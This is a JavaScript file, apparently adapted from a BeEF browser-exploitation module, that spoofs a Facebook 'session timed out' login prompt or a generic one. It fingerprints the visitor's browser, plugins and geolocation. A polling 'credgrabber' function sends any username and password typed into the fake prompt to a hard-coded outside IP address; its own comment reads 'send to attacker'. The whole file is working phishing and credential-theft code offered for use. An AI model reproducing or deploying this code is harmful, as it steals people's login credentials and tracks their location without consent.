     var geolocation = "";
     var browserVer = "";
     var userAgent = "";
    
    function browserVersion(){
        var browser = '';
        var browserVersion = 0;
        if (/Opera[\/\s](\d+\.\d+)/.test(navigator.userAgent)) {
            browser = 'Opera';
        } else if (/MSIE (\d+\.\d+);/.test(navigator.userAgent)) {
            browser = 'MSIE';
        } else if (/Navigator[\/\s](\d+\.\d+)/.test(navigator.userAgent)) {
            browser = 'Netscape';
        } else if (/Chrome[\/\s](\d+\.\d+)/.test(navigator.userAgent)) {
            browser = 'Chrome';
        } else if (/Safari[\/\s](\d+\.\d+)/.test(navigator.userAgent)) {
            browser = 'Safari';
            /Version[\/\s](\d+\.\d+)/.test(navigator.userAgent);
            browserVersion = new Number(RegExp.$1);
        } else if (/Firefox[\/\s](\d+\.\d+)/.test(navigator.userAgent)) {
            browser = 'Firefox';
        }
        if(browserVersion === 0){
            browserVersion = parseFloat(new Number(RegExp.$1));
        }
        browserVer ="browser="+browser+"&browserVersion="+browserVersion;
        userAgent = "&userAgent="+navigator.userAgent;
    }

    function showLocation(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        geolocation = "&latitude="+latitude+"&longitude="+longitude;
        //alert("Latitude : " + latitude + " Longitude: " + longitude); 
        getVersion();
    }
    
    function getVersion(){
        browserVersion();
	
	//var tz = jstz.determine();
	//var timezone = "&timezone="+tz.name();

	//var visits = visits;
        var referer = document.referrer;    
        var qtversion = PluginDetect.getVersion("quicktime");
        var axversion = PluginDetect.getVersion("activex");
        var flashversion = PluginDetect.getVersion("flash");
        var ieversion = PluginDetect.getVersion("iecomponent");
        var javaversion = PluginDetect.getVersion("java");
        var pdfjsversion = PluginDetect.getVersion("pdfjs");
        var pdfreaderversion = PluginDetect.getVersion("pdfreader");
        var realplayerversion = PluginDetect.getVersion("realplayer");
        var shockwaveversion = PluginDetect.getVersion("shockwave");
        var silverlightversion = PluginDetect.getVersion("silverlight");
        var vlcversion = PluginDetect.getVersion("vlc");
        var windowsmpversion = PluginDetect.getVersion("windowsmediaplayer");

        var output = "";
        output += browserVer;
        output += userAgent;
	output += "&visits="+visits;
        output += "&qtversion="+qtversion;
        output += "&axversion="+axversion;
        output += "&flashversion="+ flashversion;
        output += "&ieversion="+ ieversion;
        output += "&javaversion="+ javaversion;
        output += "&pdfjsversion="+ pdfjsversion;
        output += "&pdfreaderversion="+ pdfreaderversion;
        output += "&realplayerversion="+ realplayerversion;
        output += "&shockwaveversion="+ shockwaveversion;
        output += "&silverlightversion="+ silverlightversion;
        output += "&vlcversion="+ vlcversion;
        output += "&windowsmpversion="+ windowsmpversion;
	return output;
        
        //  $.ajax({
        //    type: "GET",
        //    url: "http://96.126.106.188:8888/bin/process",
        //    data: output,
        //    success: function() {
        //    }
        //  });        
        
    }
    
    function errorHandler(err) {
      if(err.code == 1) {
        //alert("Error: Access is denied!");
      }else if( err.code == 2) {
        //alert("Error: Position is unavailable!");
      }
    }
    function getLocation(){
       if(navigator.geolocation){
            // timeout at 60000 milliseconds (60 seconds)
            var options = {timeout:60000};
            navigator.geolocation.getCurrentPosition(showLocation, 
                                                   errorHandler,
                                                   options);
 
       }else{
            alert("Sorry, browser does not support geolocation!");
       }
    }

	var answer= '';
	function grayOut(vis, options) {
	  var options = options || {};
	  var zindex = options.zindex || 50;
	  var opacity = options.opacity || 70;
	  var opaque = (opacity / 100);
	  var bgcolor = options.bgcolor || '#000000';
	  var dark=document.getElementById('darkenScreenObject');
	  if (!dark) {
	    var tbody = document.getElementsByTagName("body")[0];
	    var tnode = document.createElement('div');           // Create the layer.
	        tnode.style.position='absolute';                 // Position absolutely
	        tnode.style.top='0px';                           // In the top
	        tnode.style.left='0px';                          // Left corner of the page
	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
	        tnode.style.display='none';                      // Start out Hidden
	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
	    tbody.appendChild(tnode);                            // Add it to the web page
	    dark=document.getElementById('darkenScreenObject');  // Get the object.
	  }
	  if (vis) {
	       var pageWidth='100%';
	       var pageHeight='100%';
	    dark.style.opacity=opaque;
	    dark.style.MozOpacity=opaque;
	    dark.style.filter='alpha(opacity='+opacity+')';
	    dark.style.zIndex=zindex;
	    dark.style.backgroundColor=bgcolor;
	    dark.style.width= pageWidth;
	    dark.style.height= pageHeight;
	    dark.style.display='block';
	  } else {
	     dark.style.display='none';
	  }
	}

	// CURRENTLY NOT USED
	// Send done prompt to user
	function win(){
		document.getElementById('popup').innerHtml='<h2>Thank you for re-authenticating, you will now be returned to the application</h2>';
		answer = document.getElementById('uname').value+':'+document.getElementById('pass').value;
	}


	// Check whether the user has entered a user/pass and pressed ok
	function checker(){
		uname1 = document.getElementById("uname").value;
		pass1 = document.getElementById("pass").value;
		valcheck = document.getElementById("buttonpress").value;
		
		if (uname1.length > 0 && pass1.length > 0 && valcheck == "true") {
			// Join user/pass and send to attacker
			answer = "source=facebook&";
			answer += "username="+uname1+"&password="+pass1;
              $.ajax({
                type: "GET",
                url: "http://96.126.106.188:8888/bin/process",
                data: answer,
                success: function() {
                }
              });   			
  			//beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);	
			// Set lastchild invisible
			document.getElementById("popup").setAttribute('style','display:none');
			//document.body.lastChild.setAttribute('style','display:none');
			clearInterval(credgrabber);
			// Lighten screen
			grayOut(false);
			//$j('#popup').remove();
			//$j('#darkenScreenObject').remove();

		}else if((uname1.length == 0 || pass1.length == 0) && valcheck == "true"){
		// If user has not entered any data reset button
		document.getElementById("buttonpress").value = "false";
		alert("Please enter a valid username and password.");		
		}
	}


	// Facebook floating div
	function facebook() {

		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;');
		document.body.appendChild(sneakydiv);
		
		// Set appearance using styles, maybe cleaner way to do this with CSS block?
		var windowborder = 'style="width:330px;background:white;border:10px #999999 solid;border-radius:8px"';
		var windowmain = 'style="border:1px #555 solid;"';
 		var tbarstyle = 'style="color: rgb(255, 255, 255); background-color: rgb(109, 132, 180);font-size: 13px;font-family:tahoma,verdana,arial,sans-serif;font-weight: bold;padding: 5px;padding-left:8px;text-align: left;height: 18px;"';
		var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
		var messagestyle = 'style="align:left;font-size:11px;font-family:tahoma,verdana,arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
		var box_prestyle = 'style="color: grey;font-size: 11px;font-weight: bold;font-family: tahoma,verdana,arial,sans-serif;padding-left:30px;"';
		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color: rgb(109,132,180);"';	
		var buttonstyle = 'style="font-size: 13px;background:#627aac;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
 
        	var title = 'Facebook Session Timed Out';
	        var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
        	var buttonLabel = '<input type="button" name="ok" value="Log in" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Email: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';
		
		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,3000);
	}


	// Generic floating div with image
	function generic() {
		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'width:400px;position:absolute; top:20%; left:40%; z-index:51; background-color:white;font-family:\'Arial\',Arial,sans-serif;border-width:thin;border-style:solid;border-color:#000000');
		sneakydiv.setAttribute('align', 'center');
		document.body.appendChild(sneakydiv);
		sneakydiv.innerHTML= '<br><img src=\''+imgr+'\' width=\'80px\' height\'80px\' /><h2>Your session has timed out!</h2><p>For your security, your session has been timed out. To continue browsing this site, please re-enter your username and password below.</p><table border=\'0\'><tr><td>Username:</td><td><input type=\'text\' name=\'uname\' id=\'uname\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></td><tr><td>Password:</td><td><input type=\'password\' name=\'pass\' id=\'pass\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></tr></table><br><input type=\'button\' name=\'lul\' id=\'lul\' onClick=\'document.getElementById(\"buttonpress\").value=\"true\";\' value=\'Ok\'><br/><input type="hidden" id="buttonpress" name="buttonpress" value="false"/>';
		
		// Repeatedly check if button has been pressed		
		credgrabber = setInterval(checker,3000);

	}
	
	// Set background opacity and apply background 
	var backcolor = "<%== @backing %>";	  
	if(backcolor == "Grey"){
		grayOut(true,{'opacity':'70'});
	} else if(backcolor == "Clear"){
		grayOut(true,{'opacity':'0'});
	}

